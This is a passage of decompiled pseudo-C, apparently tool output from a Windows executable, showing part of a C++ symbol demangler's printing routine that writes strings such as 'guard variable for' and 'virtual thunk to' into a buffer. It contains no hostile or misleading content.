iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000ecd5:\n        pcVar36 = \"[abi:\";\n        uStack256 = 0x14000ecee;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ed4d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        goto code_r0x00014000fff0;\n    case 0x14000ed5d:\n        uVar22 = *(arg3 + 4);\n        uVar38 = 0;\n        uStack256 = 0x14000ed6c;\n        piVar19 = fcn.14000adb0(arg1, uVar22);\n        if (piVar19 != NULL) {\n            while ((*piVar19 == 0x2f && (*(piVar19 + 4) != 0))) {\n                piVar19 = *(piVar19 + 6);\n                uVar38 = uVar38 + 1;\n                if (piVar19 == NULL) {\ncode_r0x00014000eda2:\n                    do {\n                        iVar14 = uVar35;\n                        *(arg1 + 0x13c) = iVar14;\n                        uStack256 = 0x14000edd2;\n                        fcn.1400113f0(arg1, 0x11, uVar22);\n                        if (iVar14 < uVar38 - 1) {\n                            puVar34 = 0x14010c850;\n                            iVar15 = *(arg1 + 0x100);\n                            do {\n                                uVar27 = *puVar34;\n                                if (iVar15 == 0xff) {\n                                    arg1[0xff] = 0;\n                                    uStack256 = 0x14000ee3a;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                    iVar18 = 1;\n                                    iVar15 = 0;\n                                }\n                                else {\n                                    iVar18 = iVar15 + 1;\n                                }\n                                puVar34 = puVar34 + 1;\n                                *(arg1 + 0x100) = iVar18;\n                                arg1[iVar15] = uVar27;\n                                arg1[0x108] = uVar27;\n                                iVar15 = iVar18;\n                            } while (puVar34 != 0x14010c852);\n                        }\n                        uVar35 = iVar14 + 1U;\n                    } while (iVar14 + 1U != uVar38);\n                    return;\n                }\n            }\n            if (uVar38 == 0) {\n                return;\n            }\n            goto code_r0x00014000eda2;\n        }\n        uStack256 = 0x140010fdd;\n        fcn.140012d80(arg1, 0x11, uVar22);\n        pcVar36 = 0x14010c8aa;\ncode_r0x00014000ad10:\n        *(*0x20 + -8) = unaff_RBP;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        *(*0x20 + -0x50) = 0x14000ad26;\n        iVar15 = sub.msvcrt.dll_strlen(pcVar36);\n        if (iVar15 != 0) {\n            pcVar31 = pcVar36 + iVar15;\n            iVar15 = *(arg1 + 0x100);\n            do {\n                cVar1 = *pcVar36;\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uVar22 = *(arg1 + 0x118);\n                    pcVar3 = *(arg1 + 0x110);\n                    *(*0x20 + -0x50) = 0x14000ad8a;\n                    (*pcVar3)(arg1, 0xff, uVar22);\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    iVar18 = iVar15 + 1;\n                }\n                pcVar36 = pcVar36 + 1;\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = cVar1;\n                arg1[0x108] = cVar1;\n                iVar15 = iVar18;\n            } while (pcVar31 != pcVar36);\n        }\n        return;\n    case 0x14000ee4a:\n        pcVar36 = \"non-transaction clone for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000eead;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000eebd:\n        pcVar36 = \"transaction clone for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ef25;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000ef35:\n        pcVar36 = \"{unnamed type#\";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ef9d;\n                (**(arg1 + 0x110))(arg1);\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        puVar34 = &stack0xffffffffffffff38;\n        uStack256 = 0x1400103f3;\n        fcn.14000abc0(puVar34, 0x14010c2ac, arg3[4] + 1, in_R9);\n        uStack256 = 0x1400103fb;\n        iVar18 = sub.msvcrt.dll_strlen(puVar34);\n        iVar15 = *(arg1 + 0x100);\n        if (iVar18 != 0) {\n            puVar33 = puVar34 + iVar18;\n            iVar18 = iVar15;\n            do {\n                uVar27 = *puVar34;\n                if (iVar18 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14001045e;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 1;\n                    iVar18 = 0;\n                }\n                else {\n                    iVar15 = iVar18 + 1;\n                }\n                puVar34 = puVar34 + 1;\n                *(arg1 + 0x100) = iVar15;\n                arg1[iVar18] = uVar27;\n                arg1[0x108] = uVar27;\n                iVar18 = iVar15;\n            } while (puVar33 != puVar34);\n        }\ncode_r0x0001400103b0:\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x1400107a0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x7d;\n        arg1[0x108] = 0x7d;\n        return;\n    case 0x14000efad:\n        pcVar36 = \"{lambda(\";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f015;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n        puVar34 = 0x14010c8fe;\n        uStack256 = 0x1400102a8;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        *(arg1 + 0x138) = *(arg1 + 0x138) + -1;\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140010309;\n                (**(arg1 + 0x110))(arg1);\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar34 != 0x14010c900);\n        puVar34 = &stack0xffffffffffffff38;\n        uStack256 = 0x140010334;\n        fcn.14000abc0(puVar34, 0x14010c2ac, arg3[6] + 1, in_R9);\n        uStack256 = 0x14001033c;\n        iVar18 = sub.msvcrt.dll_strlen(puVar34);\n        iVar15 = *(arg1 + 0x100);\n        if (iVar18 != 0) {\n            puVar33 = puVar34 + iVar18;\n            iVar18 = iVar15;\n            do {\n                uVar27 = *puVar34;\n                if (iVar18 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14001039a;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 1;\n                    iVar18 = 0;\n                }\n                else {\n                    iVar15 = iVar18 + 1;\n                }\n                puVar34 = puVar34 + 1;\n                *(arg1 + 0x100) = iVar15;\n                arg1[iVar18] = uVar27;\n                arg1[0x108] = uVar27;\n                iVar18 = iVar15;\n            } while (puVar34 != puVar33);\n        }\n        goto code_r0x0001400103b0;\n    case 0x14000f025:\n        pcVar36 = \"global destructors keyed to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f08d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f09d:\n        pcVar36 = \"global constructors keyed to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f105;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f115:\n        if (**(arg3 + 6) == 0x39) {\n            pcVar36 = **(*(arg3 + 4) + 0x10);\n            if ((pcVar36[1] == 'c') && ((cVar1 = *pcVar36,  cVar1 + 0x9dU < 2 || (cVar1 + 0x8eU < 2)))) {\n                uStack256 = 0x140010e83;\n                fcn.1400126f0(arg1, 0x11, *(arg3 + 4));\n                uVar27 = 0x3c;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x140010e90;\n                unaff_RBX = arg1;\n                unaff_RSI = arg3;\n            }\n            else {\n                uStack256 = 0x14000f147;\n                iVar14 = fcn.140012f30(arg1, 0x11, arg3);\n                if (iVar14 != 0) {\n                    return;\n                }\n                uStack256 = 0x14000f15f;\n                iVar14 = fcn.1400132c0(arg1, 0x11, arg3);\n                if (iVar14 != 0) {\n                    return;\n                }\n                piVar19 = *(arg3 + 4);\n                if (((*piVar19 == 0x32) && (*(*(piVar19 + 4) + 0x10) == 1)) && (**(*(piVar19 + 4) + 8) == '>')) {\n                    uVar27 = 0x28;\n                    *0x20 = &stack0xffffffffffffff00;\n                    uStack256 = 0x140011224;\n                    unaff_RBX = arg1;\n                    unaff_RSI = arg3;\n                }\n                else {\n                    uStack256 = 0x14000f18a;\n                    iVar14 = sub.msvcrt.dll_strcmp(**(piVar19 + 4), 0x14010c869);\n                    piVar19 = *(*(arg3 + 6) + 0x10);\n                    if ((iVar14 == 0) && (*piVar19 == 3)) {\n                        if (**(piVar19 + 6) != 0x29) {\n                            *(arg1 + 0x130) = 1;\n                        }\n                        uStack256 = 0x1400113c7;\n                        fcn.140012d80(arg1, 0x11, *(piVar19 + 4));\n                    }\n                    else {\n                        uStack256 = 0x14000f1ad;\n                        fcn.140012d80(arg1, 0x11, piVar19);\n                    }\n                    iVar15 = *(arg3 + 4);\n                    uVar22 = **(iVar15 + 0x10);\n                    uStack256 = 0x14000f1c7;\n                    iVar14 = sub.msvcrt.dll_strcmp(uVar22, 0x14010c86c);\n                    if (iVar14 == 0) {\n                        uVar27 = 0x5b;\n                        *0x20 = &stack0xffffffffffffff00;\n                        uStack256 = 0x140011243;\n                        unaff_RBX = arg1;\n                        unaff_RSI = arg3;\n                    }\n                    else {\n                        uStack256 = 0x14000f1da;\n                        iVar14 = sub.msvcrt.dll_strcmp(uVar22, 0x14010c869);\n                        if (iVar14 != 0) {\n                            uStack256 = 0x140011392;\n                            fcn.1400126f0(arg1, 0x11, iVar15);\n                        }\n                        uStack256 = 0x14000f1f7;\n                        fcn.140012d80(arg1, 0x11, *(*(arg3 + 6) + 0x18));\n                        if (**(arg3 + 4) != 0x32) {\n                            return;\n                        }\n                        iVar15 = *(*(arg3 + 4) + 4);\n                        if (*(iVar15 + 0x10) != 1) {\n                            return;\n                        }\n                        uVar27 = 0x29;\n                        if (**(iVar15 + 8) != '>') {\n                            return;\n                        }\n                    }\n                }\n            }\n            goto code_r0x00014000ac40;\n        }\ncode_r0x00014000e330:\n        *(arg1 + 0x130) = 1;\n        return;\n    case 0x14000f23f:\n        puVar37 = *(arg3 + 4);\n        unaff_RSI = *(arg3 + 6);\n        if (*puVar37 == 0x32) {\n            puVar7 = **(puVar37 + 4);\n            uVar28 = *puVar7;\n            uVar38 = uVar28 - 0x61;\n            if ((uVar38 == 0) && (uVar38 = puVar7[1] - 100,  uVar38 == 0)) {\n                uVar38 = puVar7[2];\n            }\n            if ((uVar38 == 0) && (*unaff_RSI == 3)) {\n                if ((**(unaff_RSI + 4) == 1) && (**(unaff_RSI + 6) == 0x29)) {\n                    unaff_RSI = *(unaff_RSI + 4);\n                }\n            }\n            else if (*unaff_RSI == 0x39) {\n                uStack256 = 0x140011308;\n                fcn.140012d80(arg1, 0x11, *(unaff_RSI + 4));\n                goto code_r0x00014000f28f;\n            }\n            if (uVar28 == 0x73) {\n                if ((puVar7[1] == 0x5a) && (puVar7[2] == 0)) {\n                    uStack256 = 0x140010921;\n                    uVar22 = fcn.14000adb0(arg1, unaff_RSI);\n                    uStack256 = 0x140010929;\n                    uVar38 = fcn.14000aac0(uVar22);\ncode_r0x00014000af40:\n                    puVar34 = &stack0xffffffffffffffb8;\n                    uStack112 = 0x14000af62;\n                    fcn.14000abc0(puVar34, 0x14010c2ac, uVar38, in_R9);\n                    uStack112 = 0x14000af6a;\n                    iVar15 = sub.msvcrt.dll_strlen(puVar34);\n                    if (iVar15 != 0) {\n                        puVar33 = puVar34 + iVar15;\n                        iVar15 = *(arg1 + 0x100);\n                        do {\n                            uVar27 = *puVar34;\n                            if (iVar15 == 0xff) {\n                                arg1[0xff] = 0;\n                                uStack112 = 0x14000afca;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                iVar18 = 1;\n                                iVar15 = 0;\n                            }\n                            else {\n                                iVar18 = iVar15 + 1;\n                            }\n                            puVar34 = puVar34 + 1;\n                            *(arg1 + 0x100) = iVar18;\n                            arg1[iVar15] = uVar27;\n                            arg1[0x108] = uVar27;\n                            iVar15 = iVar18;\n                        } while (puVar34 != puVar33);\n                    }\n                    return;\n                }\n                if (((uVar28 == 0x73) && (puVar7[1] == 0x50)) && (uVar38 = 0,  puVar7[2] == 0)) {\n                    do {\n                        if ((*unaff_RSI != 0x2f) || (piVar19 = *(unaff_RSI + 4),  piVar19 == NULL)) break;\n                        if (*piVar19 == 0x4c) {\n                            uStack256 = 0x140011098;\n                            piVar19 = fcn.14000adb0(arg1, *(piVar19 + 4));\n                            iVar14 = 0;\n                            for (; ((piVar19 != NULL && (*piVar19 == 0x2f)) && (*(piVar19 + 4) != 0));\n                                piVar19 = *(piVar19 + 6)) {\n                                iVar14 = iVar14 + 1;\n                            }\n                            uVar38 = uVar38 + iVar14;\n                        }\n                        else {\n                            uVar38 = uVar38 + 1;\n                        }\n                        unaff_RSI = *(unaff_RSI + 6);\n                    } while (unaff_RSI != NULL);\n                    goto code_r0x00014000af40;\n                }\n            }\n            uStack256 = 0x140010956;\n            fcn.1400126f0(arg1, 0x11, puVar37);\n            if (((*puVar7 == 0x67) && (puVar7[1] == 0x73)) && (puVar7[2] == 0)) goto code_r0x0001400113f0;\n            if (((*puVar7 == 0x73) && (puVar7[1] == 0x74)) && (puVar7[2] == 0)) {\n                uVar27 = 0x28;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x14001099c;\n                unaff_RBX = arg1;\n                goto code_r0x00014000ac40;\n            }\n        }\n        else {\n            if (*puVar37 == 0x34) {\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x1400111e6;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 0;\n                }\n                *(arg1 + 0x100) = iVar15 + 1;\n                arg1[iVar15] = 0x28;\n                arg1[0x108] = 0x28;\n                uStack256 = 0x140010a3d;\n                fcn.1400113f0(arg1, 0x11, *(puVar37 + 4));\n                uVar27 = 0x29;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x140010a4a;\n                unaff_RBX = arg1;\n                goto code_r0x00014000ac40;\n            }\n            uStack256 = 0x14000f268;\n            fcn.1400126f0(arg1, 0x11, puVar37);\n        }\n        uVar38 = *unaff_RSI;\n        if (((uVar38 < 2) || (uVar38 == 0x31)) || (uVar38 == 6)) {\n            uVar38 = unaff_RSI[1];\n            if (1 < uVar38) {\ncode_r0x000140012e50:\n                *(arg1 + 0x130) = 1;\n                return;\n            }\n            iVar14 = *(arg1 + 0x134);\n            bVar13 = true;\n            if (0x400 < iVar14) goto code_r0x000140012e50;\n        }\n        else {\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack80 = 0x140012f09;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = 0x28;\n            arg1[0x108] = 0x28;\n            uVar38 = unaff_RSI[1];\n            if ((1 < uVar38) || (iVar14 = *(arg1 + 0x134),  0x400 < iVar14)) {\n                *(arg1 + 0x130) = 1;\n                goto code_r0x000140012e24;\n            }\n            bVar13 = false;\n        }\n        unaff_RSI[1] = uVar38 + 1;\n        uVar22 = *(arg1 + 0x148);\n        *(arg1 + 0x134) = iVar14 + 1;\n        *(arg1 + 0x148) = &stack0xffffffffffffffd8;\n        uStack80 = 0x140012e02;\n        fcn.14000e2e0(arg1, 0x11, unaff_RSI);\n        *(arg1 + 0x148) = uVar22;\n        unaff_RSI[1] = unaff_RSI[1] - 1;\n        *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n        if (bVar13) {\n            return;\n        }\n        iVar18 = *(arg1 + 0x100);\ncode_r0x000140012e24:\n        if (iVar18 == 0xff) {\n            arg1[0xff] = 0;\n            uStack80 = 0x140012edc;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar15 = 1;\n            iVar18 = 0;\n        }\n        else {\n            iVar15 = iVar18 + 1;\n        }\n        *(arg1 + 0x100) = iVar15;\n        arg1[iVar18] = 0x29;\n        arg1[0x108] = 0x29;\n        return;\n    case 0x14000f28b:\n        puVar37 = *(arg3 + 4);\ncode_r0x00014000f28f:\n        unaff_RSI = puVar37;\n        if (*puVar37 == 0x32) {\n            iVar15 = *(*(puVar37 + 4) + 0x10);\n            puVar34 = *(*(puVar37 + 4) + 8);\n            if (iVar15 != 0) {\n                puVar33 = puVar34 + iVar15;\n                iVar15 = *(arg1 + 0x100);\n                do {\n                    uVar27 = *puVar34;\n                    if (iVar15 == 0xff) {\n                        arg1[0xff] = 0;\n                        uStack80 = 0x140012781;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                        iVar18 = 1;\n                        iVar15 = 0;\n                    }\n                    else {\n                        iVar18 = iVar15 + 1;\n                    }\n                    puVar34 = puVar34 + 1;\n                    *(arg1 + 0x100) = iVar18;\n                    arg1[iVar15] = uVar27;\n                    arg1[0x108] = uVar27;\n                    iVar15 = iVar18;\n                } while (puVar34 != puVar33);\n            }\n            return;\n        }\n        goto code_r0x0001400113f0;\n    case 0x14000f2af:\n        pcVar36 = \"template parameter object for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f315;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f325:\n        pcVar36 = \"reference temporary #\";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f38d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        pcVar36 = \" for \";\n        uStack256 = 0x14001008c;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 6));\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400100e5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f39d:\n        if (*(arg3 + 0x1a) == 0) {\n            if (*(*(arg3 + 4) + 0x10) != 0x14010da20) {\n                uStack256 = 0x14000f3c7;\n                fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14001102a;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 0;\n                }\n                *(arg1 + 0x100) = iVar15 + 1;\n                arg1[iVar15] = 0x20;\n                arg1[0x108] = 0x20;\n            }\n            pcVar36 = \"_Accum\";\n            if (*(arg3 + 6) == 0) {\n                pcVar36 = \"_Fract\";\n            }\n        }\n        else {\n            pcVar36 = \"_Sat \";\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x1400109e9;\n            unaff_RBX = arg1;\n            unaff_RBP = uVar35;\n            unaff_RSI = arg3;\n        }\n        goto code_r0x00014000ad10;\n    case 0x14000f40e:\n        uVar22 = *(arg1 + 0x170);\n        uVar4 = *(arg1 + 0x128);\n        *(arg1 + 0x170) = arg3;\n        *(arg1 + 0x128) = 0;\n        uStack256 = 0x14000f43c;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        if (arg1[0x108] == '<') {\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x140010cc6;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n        }\n        else {\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140010ca6;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = 0x3c;\n            arg1[0x108] = 0x3c;\n            uStack256 = 0x14000f483;\n            fcn.1400113f0(arg1, 0x11, *(arg3 + 6));\n            if (arg1[0x108] != '>') {\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x140010c65;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    iVar18 = iVar15 + 1;\n                }\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = 0x3e;\n                arg1[0x108] = 0x3e;\n                *(arg1 + 0x128) = uVar4;\n                *(arg1 + 0x170) = uVar22;\n                return;\n            }\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x140010c85;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n        }\n        goto code_r0x00014000ac40;\n    case 0x14000f4cc:\n        pcVar36 = \"guard variable for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f52d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f53d:\n        pcVar36 = \"java Class for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f5a5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f5b5:\n        pcVar36 = \"covariant return thunk to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f61d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000f62d:\n        pcVar36 = \"virtual thunk to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000f695;\n                (**(arg1 + 0x110))(arg1, 